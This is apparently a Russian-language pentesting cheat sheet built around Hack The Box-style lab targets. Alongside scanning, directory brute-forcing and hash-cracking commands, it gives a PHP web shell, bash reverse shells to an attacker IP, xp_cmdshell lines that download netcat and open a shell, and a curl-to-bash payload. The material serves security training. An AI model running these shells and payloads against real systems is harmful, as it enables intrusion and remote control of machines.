---
title: "Инструменты пентестинга и полезные команды"
slug: "instrumenty-pentestinga-i-poleznye-komandy"
date: 2022-10-05
---

[GTFOBins](https://gtfobins.github.io/) — список Unix-бинарников, которые можно использовать для обхода локальных ограничений безопасности в неправильно настроенных системах.

[Kali OS](https://www.kali.org/)

[Выбор сетевых репозиториев](https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/)

По умолчанию:

```bash
echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" | sudo tee /etc/apt/sources.list
```

Более стабильная версия:

```bash
echo "deb http://http.kali.org/kali kali-last-snapshot main contrib non-free" | sudo tee /etc/apt/sources.list
```

Установить все инструменты:

```bash
sudo apt install -y kali-linux-large
```

Установить GUI:

```bash
sudo apt install -y kali-win-kex
```

[Документация GUI.](https://www.kali.org/docs/wsl/win-kex/) Запуск GUI, для выхода из полноэкранного режима нажмите **F8**:

```bash
kex --win -s
```

[Wappalyzer](https://www.wappalyzer.com/apps) — расширение браузера для просмотра технологий, используемых на сайтах.

OpenVPN

```bash
sudo openvpn --config vpn.ovpn --daemon
```

Сетевой интерфейс можно проверить, выполнив команду **ifconfig** в терминале.

Отключение

```bash
sudo ifconfig tun1 down
```

Поиск веб-каталогов на сайте:
`dirsearch -u http://october.metaltech.stf/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt`

Responder

```bash
sudo responder -I tun0
```

John the ripper

```bash
zip2john backup.zip > hashes
```

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

Определение возможных хешей

```bash
hashid 2cb42f8734ea607eefed3b70af13bbd3
```

Взлом хеша

```bash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

[Пентестинг MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

[Шпаргалка по SQL-инъекциям MSSQL](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

Impacket mssql клиент

```bash
impacket-mssqlclient ARCHETYPE/[email protected] -windows-auth
```

```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.17.81/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.17.81 443"
```

SQL map

```bash
sqlmap -u 'http://10.129.10.184/dashboard.php?search=asd' --cookie='PHPSESSID=tg7rj9h95j4bb1u3211ti406qo'
```

```bash
sqlmap -u 'http://10.129.10.184/dashboard.php?search=asd' --cookie='PHPSESSID=tg7rj9h95j4bb1u3211ti406qo' --os-shell
```

[winPEAS](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe) (повышение привилегий Windows)

[linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) (повышение привилегий Linux)

Evil Win Remote

```bash
evil-winrm -i 10.129.233.177 -u administrator -p badminton
```

[Nmap](https://nmap.org/)

```bash
sudo nmap -sV 192.168.1.1

sudo nmap -sV -sC 192.168.1.1

sudo nmap -p- --min-rate 5000 -sV 192.168.1.1
```

Gobuster

```bash
go install github.com/OJ/gobuster/v3@latest
git clone https://github.com/danielmiessler/SecLists.git
gobuster dir --url http://10.129.236.130/ --wordlist ./SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
gobuster dir --url http://10.129.119.70/ --wordlist ./SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
```

MySQL

```bash
mysql -h 10.129.132.32 -u root
```

```sql
SHOW databases; : Выводит базы данных, к которым есть доступ.
USE {database_name}; : Переключиться на базу данных с именем {database_name}.
SHOW tables; : Выводит доступные таблицы в текущей базе данных.
SELECT * FROM {table_name}; : Выводит все данные из таблицы {table_name}.
```

SMB

```bash
smbclient -N -L \\\\{TARGET_IP}\\
-N : Без пароля
-L : Эта опция позволяет посмотреть, какие сервисы доступны на сервере
```

[Полностью интерактивные оболочки](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

Простой PHP Shell

```php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Reverse Shell

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1' > shell.sh
```

Или

```bash
bash -c "bash -i >& /dev/tcp/{your_IP}/1337 0>&1"
```

Запуск ncat listener

```bash
nc -nvlp 1337
```

Запуск веб-сервера

```bash
python3 -m http.server 8000
```

Пример запуска

```
http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash
```

Функциональная оболочка

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Улучшение оболочки

```bash
script /dev/null -c bash
```

[Burp Suite](https://portswigger.net/burp/releases/professional-community-2022-7-1?requestededition=community)

[Metasploit](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html)

[sqlmap](https://sqlmap.org/)
